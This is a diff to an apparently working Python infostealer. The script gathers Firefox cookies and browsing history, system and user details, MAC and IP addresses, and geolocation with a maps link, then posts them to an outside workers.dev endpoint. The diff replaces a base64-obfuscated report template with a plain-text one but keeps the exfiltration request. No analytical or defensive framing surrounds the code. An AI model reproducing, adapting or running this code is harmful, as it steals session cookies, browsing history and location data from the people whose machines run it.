@@ -1,8 +1,7 @@
-```python
+```python	
 import os
 import sys
 import json
-import base64
 import socket
 import psutil
 import pathlib
@@ -106,12 +105,9 @@ f_co = get_moz()
 cookies = format1(f_co[0])
 places = format1(f_co[1], path=True)
 
-payload = f"{base64.b64decode(b'Ci0tLS0tLS0tLS0g8J2QlPCdkJLwnZCE8J2QkSDwnZCD8J2QgPCdkJPwnZCAIC0tLS0tLS0tLS0KCkV4ZWN1dGlvbiB0aW1lOiB7dGltZX0KClVzZXI6IHt1c2VyfQoKTG9nZ2VkIFVzZXJzOiB7bG99CgpDUFU6IHtjY30KCkNQVSBGcmVxdWVuY3k6IHtjZn0KClJBTToge3JhbX1NQgoKUHVibGljIElQOiB7cHVibGljX2lwKCl9CgpDb3VudHJ5OiB7aV9pbmZvWydjb3VudHJ5J119CgpSZWdpb246IHtpX2luZm9bJ3JlZ2lvbk5hbWUnXX0KCkNpdHk6IHtpX2luZm9bJ2NpdHknXX0KCklTUDoge2lfaW5mb1snaXNwJ119CgpPcmdhbml6YXRpb246IHtpX2luZm9bJ29yZyddfQoKQWxpYXM6IHtpX2luZm9bJ2FzJ119CgpJUHY0OiB7aTR9CgpJUHY2OiB7aTZ9CgpNQUM6IHttY30KClN5c3RlbToge3N5fQoKTm9kZToge25kfQoKVmVyc2lvbjoge3JlfQoKR29vZ2xlIE1hcHMgTGluazogaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzL3NlYXJjaC8/cT17aV9pbmZvWydsYXQnXX0se2lfaW5mb1snbG9uJ119CgotLS0tLS0tLSDwnZCF8J2QovCdkKXwnZCe8J2QrCDwnZCA8J2Qp/CdkJ0g8J2Qg/CdkKLwnZCr8J2QnvCdkJzwnZCt8J2QqPCdkKvwnZCi8J2QnvCdkKwgLS0tLS0tLS0tCgp7ZF9wYXRofQoKe2ZfcGF0aH0KCi0tLS0tLS0tLS0tLS0tLSDwnZCC8J2QqPCdkKjwnZCk8J2QovCdkJ7wnZCsIC0tLS0tLS0tLS0tLS0tLS0KCntjb29raWVzfQoKLS0tLS0tLS0tLS0g8J2QhfCdkKLwnZCr8J2QnvCdkJ/wnZCo8J2QsSDwnZCH8J2QovCdkKzwnZCt8J2QqPCdkKvwnZCyIC0tLS0tLS0tLS0tLQoKe3BsYWNlc30KCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0K')}"
-content = json.dumps({"msg": payload})
-
+payload = b"\n---------- \xf0\x9d\x90\x94\xf0\x9d\x90\x92\xf0\x9d\x90\x84\xf0\x9d\x90\x91 \xf0\x9d\x90\x83\xf0\x9d\x90\x80\xf0\x9d\x90\x93\xf0\x9d\x90\x80 ----------\n\nExecution time: {time}\n\nUser: {user}\n\nLogged Users: {lo}\n\nCPU: {cc}\n\nCPU Frequency: {cf}\n\nRAM: {ram}MB\n\nPublic IP: {public_ip()}\n\nCountry: {i_info['country']}\n\nRegion: {i_info['regionName']}\n\nCity: {i_info['city']}\n\nISP: {i_info['isp']}\n\nOrganization: {i_info['org']}\n\nAlias: {i_info['as']}\n\nIPv4: {i4}\n\nIPv6: {i6}\n\nMAC: {mc}\n\nSystem: {sy}\n\nNode: {nd}\n\nVersion: {re}\n\nGoogle Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info['lon']}\n\n-------- \xf0\x9d\x90\x85\xf0\x9d\x90\xa2\xf0\x9d\x90\xa5\xf0\x9d\x90\x9e\xf0\x9d\x90\xac \xf0\x9d\x90\x80\xf0\x9d\x90\xa7\xf0\x9d\x90\x9d \xf0\x9d\x90\x83\xf0\x9d\x90\xa2\xf0\x9d\x90\xab\xf0\x9d\x90\x9e\xf0\x9d\x90\x9c\xf0\x9d\x90\xad\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xa2\xf0\x9d\x90\x9e\xf0\x9d\x90\xac ---------\n\n{d_path}\n\n{f_path}\n\n--------------- \xf0\x9d\x90\x82\xf0\x9d\x90\xa8\xf0\x9d\x90\xa8\xf0\x9d\x90\xa4\xf0\x9d\x90\xa2\xf0\x9d\x90\x9e\xf0\x9d\x90\xac ----------------\n\n{cookies}\n\n----------- \xf0\x9d\x90\x85\xf0\x9d\x90\xa2\xf0\x9d\x90\xab\xf0\x9d\x90\x9e\xf0\x9d\x90\x9f\xf0\x9d\x90\xa8\xf0\x9d\x90\xb1 \xf0\x9d\x90\x87\xf0\x9d\x90\xa2\xf0\x9d\x90\xac\xf0\x9d\x90\xad\xf0\x9d\x90\xa8\xf0\x9d\x90\xab\xf0\x9d\x90\xb2 ------------\n\n{places}\n\n----------------------------------------\n"
+content = json.dumps({"msg": payload.decode()})
 r = requests.post("https://curly-dream-4ac6.encrypteddev111k.workers.dev/", data=content)
 if r.status_code == 200:
 	print("yes")
-	
-
 ```
